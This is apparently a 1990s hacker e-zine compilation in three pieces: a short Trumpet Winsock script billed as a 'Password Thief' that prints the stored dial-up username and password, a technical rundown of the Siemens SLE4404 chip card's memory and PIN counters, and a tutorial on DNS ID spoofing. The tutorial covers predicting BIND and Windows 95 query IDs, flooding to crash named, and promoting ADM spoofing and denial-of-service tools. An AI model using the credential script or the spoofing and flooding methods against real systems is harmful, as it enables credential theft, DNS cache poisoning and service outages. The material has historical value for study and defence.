Upon discovering Doctor Jeep's "Trumpet Winsock Password Hacker" in P51-03, I
felt obligated to share a small piece of code that I don't like to admit
that I created, far earlier than the esteemed Jeep's published work.  As his
requires access to a Pascal compiler and does not seem to be coded with
portability in mind, the fact that my script requires Trumpet itself to run
does not seem too great a hindrance.  The irony is that not only is the
"cipher" a simple obfuscating XOR, but that Trumpet itself will decode it
for you.

<++> password.cmd
# Put in Trumpet Winsock directory, run under "Dialer/Other"
# Cannot currently use any file other than trumpwsk.ini,
# apparently due to implementation errors in the "load" function
display \n
display "Trumpet Password Thief 1.0, 8-18-95"\n
display \n
if [load $username]
        display "username: "
        display $username\n
else
        display "ERR: cannot load username"\n
end
if [load $password]
        display "password: "
        display $password\n
else
        display "ERR: cannot load password"\n
end
display \n

                        Siemens Chip Card Technology

                       :----------------------------:



  Chip cards differ from one another in memory size, type of memory (PROM or
EEPROM), security logic and micro-controller.  This article will discuss the
Siemens SLE4404 chip card technology.

  The SLE4404 is employed for electronic purse cards and bank transactions,
cellular telephony (pre-payed cards), user IDs for access control, etc. (some
examples: SmartCard, ViaCard and Italian Bancomat).  Its data can be accessed
through a simple TTL serial channel, providing a +5 Vcc power supply from an
external source.


 Inside the chip
 ~~~~~~~~~~~~~~~
  The chipcard has at its disposal EEPROM memory consisting of a 416-bit matrix
(each row is 16-bits) that is protected by security logic providing access 
control.

  This is the logic diagram:

                  +------------------------+     +------------------+
                  |     Address Counter    | --> |  Column Decoder  |
                  +------------------------+     +------------------+
                        ^             |                    | 16
                        |             v                    v
                  +-----------+  +---------+     +------------------+
 C3,C8,C2,C5  --> | Control & |  | Row     |     | User mem 208 bit |
 C1 (Vcc)     --> | Security  |  | Decoder | --> | Sec unit 192 bit |
 C7 (I/O)    <--> | Logic     |  |         | 26  | Special mem unit |
                  +-----------+  +---------+     +------------------+
                        ^                                  ^
                        |                                  |
                        +----------------------------------+

  The SLE4404 memory is subdivided in three main memory blocks: one is read
only (a "PROM" containing the manufacturer code and/or a serial number and
an expiration date), the second is both readable and writeable (user memory)
and the last block cannot be written to unless the lock-out fuse has been 
fused.

  This is the memory map:

  BLOCK TYPE         SIZE (BIT)   ADDRESS   READABLE   WRITEABLE   ERASEABLE

 EEPROM #2               16        96-111     Yes        U.C.         U.C.
 Frame memory block
 - F.M. config            2       112-113     Yes        Yes       U.C./R.C.
 - Frame memory         206       114-319    [cfg]      [cfg]      U.C./R.C.
 Frame code              32       320-351    [fuse]     [fuse]       [cfg]
 Frame counter           64       352-415     Yes        Yes         [cfg]
-----------------------------------------------------------------------------

  Meaning of abbreviations:

 U.C.   -  User code required
           (each time the code is entered the error counter is decreased)
 R.C.   -  Frame code required
           (each time the code is entered the frame counter is decreased)
 [fuse] -  Operation allowed ONLY IF lock-out fuse is not fused
 [cfg]  -  Operation allowed according to frame memory configuration

  Frame memory configuration table:

 BIT 112    BIT 113    MEMORY MODE    READABLE    WRITEABLE
-----------------------------------------------------------------------------
    0          0        Secret ROM      Yes           No
    0          1          R.O.M.        Yes           No
    1          0       Secret PROM      U.C.         U.C.
    1          1         P.R.O.M.       U.C.         U.C.
-----------------------------------------------------------------------------

  The first 16-bit block is for the Manufacturer Code.  The following 48-bit
block is called Application ROM, containing another code (Manufacturer sub
code or info, serial number, sub-type of card, etc).

  The User Code is the access code (PIN) used to read/write/erase memory.  
This code can be modified provided that the fuse was not fused, while the
error counter value can be modified even if the fuse was fused...

  Please note that access to memory is blocked after four incorrect access
trials (checked by the counter).  The same is for the Frame Code and the
Frame [error] Counter (note that the number of incorrect accesses is limited
to three trials instead of four).

  Finally, the Frame Memory is generally used for storing personal user
information or the credit limit (money that can be fetched in a bank 
transaction, or the remaining "virtual" credit that a pre-payed cellular card
contains).

                           DNS ID Hacking
                    

--[1]-- DNS ID Hacking Presentation

You might be wondering what DNS ID Hacking (or Spoofing) is all about.  DNS ID
Hacking isn't a usual way of hacking/spoofing such jizz or any-erect. This
method is based on a vulnerability on DNS Protocol.  More brutal, the DNS ID
hack/spoof is very efficient and very strong as there is no generation of DNS
daemons that escapes from it (even WinNT!).

--[1.1]-- DNS Protocol mechanism explanation

In the first step, you must know how the DNS works.  I will only explain the
most important facts of this protocol.  In order to do that, we will follow
the way of a DNS request packet from A to Z!

Name resolution example:
The client (bla.bibi.com) sends a request of resolution of the domain
"www.heike.com".  To resolve the name, bla.bibi.com uses "dns.bibi.com" for
DNS.  Let's take a look at the following picture..

/---------------------------------\
| 111.1.2.123  =  bla.bibi.com    |
| 111.1.2.222  =  dns.bibi.com    |
| format:                         |
| IP_ADDR:PORT->IP_ADDR:PORT      |
| ex:                             |
| 111.1.2.123:2999->111.1.2.222:53|
\---------------------------------/
...
  gethosbyname("www.heike.com");
...

[bla.bibi.com]                                 [dns.bibi.com] 
111.1.2.123:1999 ---> [?www.heike.com] ------> 111.1.2.222:53

Here we see our resolution name request from source port 1999 which is asking
to DNS on port 53 (note: DNS is always on port 53).  Now that dns.bibi.com has
received the resolution request from bla.bibi.com, dns.bibi.com will have to
resolve the name:

[dns.bibi.com]                                   [ns.internic.net]
111.1.2.222:53 --------> [dns?www.heike.com] ----> 198.41.0.4:53

dns.bibi.com asks ns.internic.net who the root name server for the address
of www.heike.com is, and if it doesn't have it and sends the request to a name
server which has authority on '.com' domains (note: we send a request to the
Internic because it could have this request in its cache).

[ns.internic.net]                                         [ns.bibi.com]
198.41.0.4:53 ------> [ns for.com is 144.44.44.4] ------> 111.1.2.222:53

Here we can see that ns.internic.net answered to ns.bibi.com (which is the DNS
that has authority over the domain bibi.com), that the name server of for.com
has the IP 144.44.44.4 (let's call it ns.for.com).  Now our ns.bibi.com will
ask to ns.for.com for the address of www.heike.com, but this one doesn't have
it and will forward the request to the DNS of heike.com which has authority
for heike.com.

[ns.bibi.com]                                   [ns.for.com]
111.1.2.222:53 ------> [?www.heike.com] -----> 144.44.44.4:53

The answer from ns.for.com:

[ns.for.com]                                                [ns.bibi.com]
144.44.44.4:53 ------>[ns for heike.com is 31.33.7.4] ---> 144.44.44.4:53

Now that we know which IP address has authority on the domain "heike.com"
(we'll call it ns.heike.com), we ask it what's the IP of the machine 
www.heike.com.

[ns.bibi.com]                             [ns.heike.com]
111.1.2.222:53 -----> [?www.heike.com] ----> 31.33.7.4:53

We now have our answer:

[ns.heike.com]                                             [ns.bibi.com]
31.33.7.4:53 -------> [www.heike.com == 31.33.7.44] ----> 111.1.2.222:53

Great we have the answer, we can forward it to our client bla.bibi.com.

[ns.bibi.com]                                                 [bla.bibi.com]
111.1.2.222:53 -------> [www.heike.com == 31.33.7.44] ----> 111.1.2.123:1999

Now bla.bibi.com knows the IP of www.heike.com.

Now let's imagine that we'd like to have the name of a machine from its IP, in
order to do that, we proceed a bit differently as the IP will have to be
transformed.

Reverse name lookup resolution:
100.20.40.3 will become 3.40.20.100.in-addr.arpa

This method is only for the IP resolution request (reverse DNS).

Let's look at a practical example of when we take the IP address of
www.heike.com (31.33.7.44 or "44.7.33.31.in-addr.arpa" after the translation
into a comprehensible format by DNS).

...
   gethostbyaddr("31.33.7.44");
...

We send our request to ns.bibi.com:

[bla.bibi.com]                                            [ns.bibi.com]
111.1.2.123:2600 -----> [?44.7.33.31.in-addr.arpa] -----> 111.1.2.222:53

Which is forwarded to ns.internic.net:

[ns.bibi.com]                                          [ns.internic.net]
111.1.2.222:53 -----> [?44.7.33.31.in-addr.arpa] ------> 198.41.0.4:53 

ns.internic.net will send the IP of a name server which has authority on
'31.in-addr.arpa'.

[ns.internic.net]                                             [ns.bibi.com]
198.41.0.4:53 --> [DNS for 31.in-addr.arpa is 144.44.44.4] -> 111.1.2.222:53

Now ns.bibi.com will ask the same question to the DNS at 144.44.44.4:

[ns.bibi.com]                                          [ns.for.com]
111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 144.44.44.4:53

And so on.  The mechanism is nearly the same that was used for name resolution.

--[1.2]-- DNS packet header

Here is the format of a DNS message :

--[1.3]--  Structure of DNS packets.

__ID__

The ID permits us to identify each DNS packet, since exchanges between name
servers are from port 53 to port 53, and more it might be more than one
request at a time, so the ID is the only way to recognize the different DNS
requests. Well talk about it later..

__flags__

The flags area is divided into several parts :

       4 bits                    3 bits (always 0)
       |                         |

1 bit

QR     = If the QR bit = 0, it means that the packet is a question, otherwise
         it's an answer.

opcode = If the value is 0 for a normal request, 1 for a reserve request, and
         2 for a status request (we don't need to know all these modes).

AA     = If it's equal to 1, it says that the name server has an authoritative
         answer.

TC     = No matter

RD     = If this flag is to 1, it means "Recursion Request", for example when
         bla.bibi.com asks ns.bibi.com to resolve the name, the flag tells the
         DNS to assume this request.

RA     = If it's set to 1, it means that recursion is available.  This bit is
         set to 1 in the answer of the name server if it supports recursion.

Zero   = Here are three zeroes...

rcode  = It contains the return error messages for DNS requests if 0, it means
         "no error", 3 means "name error"

The 2 following flags don't have any importance for us.

DNS QUESTION:

Here is the format of a DNS question :

+-----------------------------------------------------------------------+
|                        name of the question                           |
+-----------------------------------------------------------------------+
|       type of question         |      type of query                   |
+--------------------------------+--------------------------------------+

The structure of the question is like this.

example:
www.heike.com  will be [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0] 
for an IP address, the format remains the same.

44.33.88.123.in-addr.arpa would be:
[2|4|4|2|3|3|2|8|8|3|1|2|3|7|i|n|-|a|d|d|r|4|a|r|p|a|0]
[note]: a compression format exists, but we won't cover it.


type of question:

Here are the values that we will use much of the time (there are many more,
but these are only ones relevant):

  name    value
   A    |   1    | IP Address          (resolving a name to an IP)
   PTR  |   12   | Pointer             (resolving an IP to a name)


type of query:

The values are the same as the type of question.

DNS ANSWER:

Here is the format of an answer (an RR)

+------------------------------------------------------------------------+
|      name of the domain                                                |
+------------------------------------------------------------------------+
|   type                           |    class                            |
+----------------------------------+-------------------------------------+
|                           TTL (time to live)                           |
+------------------------------------------------------------------------+
| resource data length       |                                           |
|----------------------------+                                           |
|                       resource data                                    |
+-------------------------------------------------------------------------

name of the domain:

The name of the domain in reports to the following resource:  The domain name
is stored in the same way that the part question for the resolution request of
www.heike.com, the flag "name of the domain" will contain
[3|w|w|w|5|h|e|i|k|e|3|c|o|m|0].

type:

The type flag is the same than "type of query" in the question part of the
packet.

class:
The class flag is equal to 1 for Internet data.

time to live:
This flag explains in seconds the time-life of the information into the
name server cache.

resource data length: 
The length of resource data, for example if resource data length is 4, it
means that the data in resources data are 4 bytes long.

resource data:  
here we put the IP for example (at least in our case)

I will offer you a little example that explains this better:

Here is what's happening when ns.bibi.com asks ns.heike.com for 
www.heike.com's address

ns.bibi.com:53 ---> [?www.heike.com] ----> ns.heike.com:53 (Phear Heike ;)

+---------------------------------+--------------------------------------+
|   ID = 1999                     | QR = 0 opcode = 0 RD = 1             |
+---------------------------------+--------------------------------------+
| numbers of questions = htons(1) | numbers of answers = 0               |
+---------------------------------+--------------------------------------+
| number of RR authoritative = 0  | number of supplementary RR = 0       |
+---------------------------------+--------------------------------------+
<the question part>
+------------------------------------------------------------------------+
|   name  of the question = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]              |
+------------------------------------------------------------------------+
|  type of question = htons(1)    |      type of query=htons(1)          |
+---------------------------------+--------------------------------------+

here is for the question.

now let's stare the answer of ns.heike.com

ns.heike.com:53 -->[IP of www.heike.com is 31.33.7.44] --> ns.bibi.com:53

+---------------------------------+---------------------------------------+
|   ID = 1999                     | QR=1 opcode=0 RD=1  AA =1  RA=1       |
+---------------------------------+---------------------------------------+
| numbers of questions = htons(1) | numbers of answers = htons(1)         |
+---------------------------------+---------------------------------------+
| number of RR authoritative = 0  | number of supplementary RR = 0        |
+---------------------------------+---------------------------------------+
+-------------------------------------------------------------------------+
|   name  of the question = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]               |
+-------------------------------------------------------------------------+
|   type of question = htons(1)   |      type of query = htons(1)         |
+-------------------------------------------------------------------------+
+-------------------------------------------------------------------------+
|   name of the domain = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                  |
+-------------------------------------------------------------------------+
|       type        = htons(1)    |      class    = htons(1)              |
+-------------------------------------------------------------------------+
|                       time to live = 999999                             |
+-------------------------------------------------------------------------+
| resource data length = htons(4) | resource data=inet_addr("31.33.7.44") |
+-------------------------------------------------------------------------+

Yah! That's all for now :))
 
Here is an analysis:
In the answer QR = 1 because it's an answer :)
AA = 1 because the name server has authority in its domain
RA = 1 because recursion is available

Good =) I hope you understood that cause you will need it for the following
events.

--[2.0]-- DNS ID hack/spoof

Now it's time to explain clearly what DNS ID hacking/spoofing is.
Like I explained before, the only way for the DNS daemon to recognize
the different questions/answers is the ID flag in the packet. Look at this
example:

ns.bibi.com;53 ----->[?www.heike.com] ------> ns.heike.com:53

So you only have to spoof the ip of ns.heike.com and answer your false
information before ns.heike.com to ns.bibi.com!

ns.bibi.com <------- . . . . . . . . . . .  ns.heike.com 
                   |
                   |<--[IP for www.heike.com is 1.2.3.4]<-- hum.roxor.com 

But in practice you have to guess the good ID :) If you are on a LAN, you
can sniff to get this ID and answer before the name server (it's easy on a
Local Network :)

If you want to do this remotely you don't have a lot a choices, you only
have 4 basics methods:

1.) Randomly test all the possible values of the ID flag. You must answer
    before the ns ! (ns.heike.com in this example). This method is obsolete
    unless you want to know the ID .. or any other favorable condition to
    its prediction.

2.) Send some DNS requests (200 or 300) in order to increase the chances
    of falling on the good ID.

3.) Flood the DNS in order to avoid its work. The name server will crash
    and show the following error!

    >> Oct 06 05:18:12 ADM named[1913]: db_free: DB_F_ACTIVE set - ABORT
       at this time named daemon is out of order :)

4.) Or you can use the vulnerability in BIND discovered by SNI (Secure
    Networks, Inc.) with ID prediction (we will discuss this in a bit).  


##################### Windows ID Vulnerability ###########################

I found a heavy vulnerability in Windows 95 (I haven't tested it on
WinNT), lets imagine my little friend that's on Windows 95.
Windows ID's are extremely easy to predict because it's "1" by default :))) 
and "2" for the second question (if they are 2 questions at the same time).


######################## BIND Vulnerability ##############################

There is a vulnerability in BIND (discovered by SNI as stated earlier).
In fact, DNS IS are easily predictable, you only have to sniff a DNS in
order to do what you want. Let me explain...

The DNS uses a random ID at the beginning but it only increase this ID for
next questions ... =)))

It's easy to exploit this vulnerability.
Here is the way:

1. Be able to sniff easily the messages that comes to a random DNS (ex.
   ns.dede.com for this sample).

2. You ask NS.victim.com to resolve (random).dede.com. NS.victim.com will
   ask to ns.dede.com to resolve (random).dede.com

   ns.victim.com ---> [?(rand).dede.com ID = 444] ---> ns.dede.com

3. Now you have the ID of the message from NS.victim.com, now you know what
   ID area you'll have to use. (ID = 444 in this sample).

4. You then make your resolution request. ex. www.microsoft.com to
   NS.victim.com
   
   (you) ---> [?www.microsoft.com] ---> ns.victim.com

   ns.victim.com --> [?www.microsoft.com ID = 446 ] --> ns.microsoft.com
     
5. Flood the name server ns.victim.com with the ID (444) you already have and
   then you increase this one.

 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 444] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 445] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 446] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 447] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 448] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 449] --> ns.victim.com


(now you know that DNS IDs are predictable, and they only increase. You
flood ns.victim.com with spoofed answers with the ID 444+ ;)

*** ADMsnOOfID does this.


There is another way to exploit this vulnerability without a root on
any DNS

The mechanism is very simple. Here is the explanation

We send to ns.victim.com a resolution request for *.provnet.fr

(you) ----------[?(random).provnet.fr] -------> ns.victim.com

Then, ns.victim.com asks ns1.provnet.fr to resolve (random).provnet.fr.
There is nothing new here, but the interesting part begins here.

From this point you begin to flood ns.victim.com with spoofed answers
(with ns1.provnet.fr IP) with ids from 100 to 110...

(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=100] --> ns.victim.com 
(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=101] --> ns.victim.com 
(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=102] --> ns.victim.com 
(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=103] --> ns.victim.com 
.....

After that, we ask ns.victim.com if (random).provnet.fr has an IP.

If ns.victim.com give us an IP for (random).provnet.fr then we have
found the correct ID :) Otherwise we have to repeat this attack until we
find the ID. It's a bit long but it's effective. And nothing forbids you 
to do this with friends ;)

This is how ADMnOg00d works ;)

-------------------------------



########################################################################## 

Here you will find 5 programs
ADMkillDNS  - very simple DNS spoofer
ADMsniffID  - sniff a LAN and reply false DNS answers before the NS
ADMsnOOfID  - a DNS ID spoofer (you'll need to be root on a NS)
ADMnOg00d   - a DNS ID predictor (no need to be root on a NS)
ADNdnsfuckr - a very simple denial of service attack to disable DNS

Have fun!! :)
Note: You can find source and binaries of this progs at 
ftp.janova.org/pub/ADM. I'm going to make a little HOWTO soon, which would
be on janova. You need to install libpcap on your machine before any
compilation of the ADMID proggies :)


ADM Crew.

Thanks to: all ADM crew, Shok, pirus, fyber, Heike, and w00w00 (gotta love
these guys)
Special Thanks: ackboo, and of course Secure Networks, Inc. (SNI) at
www.secnet.com for finding the vulnerability =)
